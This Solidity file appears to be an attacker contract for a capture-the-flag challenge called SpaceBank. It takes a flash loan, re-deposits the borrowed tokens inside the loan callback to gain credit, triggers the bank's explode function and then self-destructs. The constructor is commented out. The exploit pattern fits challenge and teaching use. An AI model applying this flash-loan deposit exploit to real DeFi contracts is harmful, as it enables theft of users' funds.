// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import "openzeppelin/access/Ownable.sol";
import "openzeppelin/token/ERC20/IERC20.sol";
import "openzeppelin/token/ERC20/ERC20.sol";
import "./SpaceBank.sol";

contract Create2ContractAddress {
    address challenge;
    SpaceBank spaceBank;
    SpaceToken token;

    uint counter;

    // constructor(address _challenge, address _spaceBank, address _token) {
    //     challenge = _challenge;
    //     spaceBank = SpaceBank(_spaceBank);
    //     token = SpaceToken(_token);
    // }

    function executeFlashLoan(uint256 amount) external {
        if (counter == 0) {
            bytes memory data = abi.encode(block.number % 47);
            console.log(block.number);
            console.logBytes(data);
            token.approve(address(spaceBank), 1000000000000000000);
            spaceBank.deposit(amount, data);
            spaceBank.deposit(amount, "");
            counter++;
        } else {
            token.approve(address(spaceBank), 1000000000000000000);
            spaceBank.deposit(500, "");
        }
    }

    function attack_1() external {
        SpaceBank(spaceBank).flashLoan(500, address(this));
    }

    function explode() external {
        SpaceBank(spaceBank).explodeSpaceBank();
    }

    function sendEthToBank() external {
        (bool success,) = payable(address(spaceBank)).call{value : 0.001 ether}("");
        require(success, "Failed to send ether to bank");
    }

    function destroyContract() external {
        selfdestruct(payable(address(this)));
    }

    // receive() external payable {}
}